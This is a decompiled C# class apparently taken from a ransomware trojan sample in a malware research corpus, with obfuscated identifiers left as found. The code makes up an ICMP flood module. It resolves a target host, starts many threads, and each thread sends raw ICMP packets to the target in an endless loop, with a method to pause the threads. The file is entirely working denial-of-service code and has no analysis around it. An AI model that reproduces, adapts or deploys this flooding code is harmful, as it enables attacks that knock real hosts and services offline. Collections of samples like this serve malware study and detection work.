// Decompiled with JetBrains decompiler
// Type: ?1?.?13?
// Assembly: tutzutzutz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 24544FBB-E29C-4CD0-A180-E0F7591B8C92
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hela-60428f68afac01b391496fe7183b4795cc29d1e6528c4ef1f2dec9ea939ee5e7.exe

using \u003F1\u003F;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace \u003F1\u003F
{
  internal class \u003F13\u003F
  {
    private static ThreadStart[] tzurtzhjkutrzu;
    private static Thread[] gfhjfghjfgjgfhj;
    public static string ergtsergsrg;
    public static int zuitzuituzui;
    private static IPEndPoint erzertertz;
    public static ushort hjmbvmvbmvbnm;
    public static int nmbvmvnvbnm;
    private static \u003F13\u003F.\u003F14\u003F[] zirtzutzhjtrzu;
    public static int mbvmfgzjdfgh;

    public static void \u003F51\u003F()
    {
      try
      {
        \u003F13\u003F.erzertertz = new IPEndPoint(Dns.GetHostEntry(\u003F13\u003F.ergtsergsrg).AddressList[0], (int) \u003F13\u003F.hjmbvmvbmvbnm);
      }
      catch
      {
        \u003F13\u003F.erzertertz = new IPEndPoint(IPAddress.Parse(\u003F13\u003F.ergtsergsrg), (int) \u003F13\u003F.hjmbvmvbmvbnm);
      }
      \u003F13\u003F.gfhjfghjfgjgfhj = new Thread[\u003F13\u003F.mbvmfgzjdfgh];
      \u003F13\u003F.tzurtzhjkutrzu = new ThreadStart[\u003F13\u003F.mbvmfgzjdfgh];
      \u003F13\u003F.zirtzutzhjtrzu = new \u003F13\u003F.\u003F14\u003F[\u003F13\u003F.mbvmfgzjdfgh];
      for (int index = 0; index < \u003F13\u003F.mbvmfgzjdfgh; ++index)
      {
        \u003F13\u003F.zirtzutzhjtrzu[index] = new \u003F13\u003F.\u003F14\u003F(\u003F13\u003F.erzertertz, \u003F13\u003F.zuitzuituzui, \u003F13\u003F.nmbvmvnvbnm);
        \u003F13\u003F.tzurtzhjkutrzu[index] = new ThreadStart(\u003F13\u003F.zirtzutzhjtrzu[index].\u003F47\u003F);
        \u003F13\u003F.gfhjfghjfgjgfhj[index] = new Thread(\u003F13\u003F.tzurtzhjkutrzu[index]);
        \u003F13\u003F.gfhjfghjfgjgfhj[index].Start();
      }
    }

    public static void \u003F52\u003F()
    {
      for (int index = 0; index < \u003F13\u003F.mbvmfgzjdfgh; ++index)
      {
        try
        {
          \u003F13\u003F.gfhjfghjfgjgfhj[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class \u003F14\u003F
    {
      private int bvncvbncvbncvb;
      private IPEndPoint IPEo;
      private int iPSize;
      private Socket[] pSocket;

      public \u003F14\u003F(IPEndPoint _param1, int _param2, int _param3)
      {
        this.IPEo = _param1;
        this.bvncvbncvbncvb = _param2;
        this.iPSize = _param3;
      }

      public void \u003F47\u003F()
      {
        while (true)
        {
          byte[] buffer = new byte[this.iPSize];
          try
          {
            this.pSocket = new Socket[this.bvncvbncvbncvb];
            for (int index = 0; index < this.bvncvbncvbncvb; ++index)
            {
              this.pSocket[index] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
              this.pSocket[index].Blocking = false;
              this.pSocket[index].SendTo(buffer, (EndPoint) this.IPEo);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.bvncvbncvbncvb; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.bvncvbncvbncvb; ++index)
            {
              try
              {
                if (this.pSocket[index].Connected)
                  this.pSocket[index].Disconnect(false);
                this.pSocket[index].Close();
                this.pSocket[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
